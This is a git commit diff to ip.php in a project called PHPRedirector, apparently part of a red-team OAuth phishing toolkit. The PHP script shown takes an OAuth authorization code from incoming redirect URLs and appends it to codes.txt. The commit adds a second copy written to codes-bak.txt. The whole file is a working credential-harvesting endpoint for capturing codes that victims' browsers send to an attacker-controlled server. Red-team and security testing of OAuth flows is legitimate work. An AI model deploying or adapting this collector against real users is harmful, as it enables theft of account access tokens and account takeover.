741a4528f01b9c22a6f61136c1888400561cbcbd
Beau Bullock <beau@dafthack.com>
2023-09-05 12:35:51 -0400

    Update ip.php

--- PHPRedirector/ip.php
+++ PHPRedirector/ip.php
@@ -1,10 +1,15 @@
 <?php
 $requestUrl = $_SERVER['REQUEST_URI'];
 $file = 'codes.txt';
+$bakfile = 'codes-bak.txt';
 $fp = fopen($file, 'a');
+$fp2 = fopen($bakfile, 'a');
 $trim = trim($requestUrl, "/?code=");
 $oauthCode = strtok($trim, "&");
 fwrite($fp, "OAuth Code:\n");
 fwrite($fp, $oauthCode . "\n\n\n");
 fclose($fp);
+fwrite($fp2, "OAuth Code:\n");
+fwrite($fp2, $oauthCode . "\n\n\n");
+fclose($fp2);
 ?>
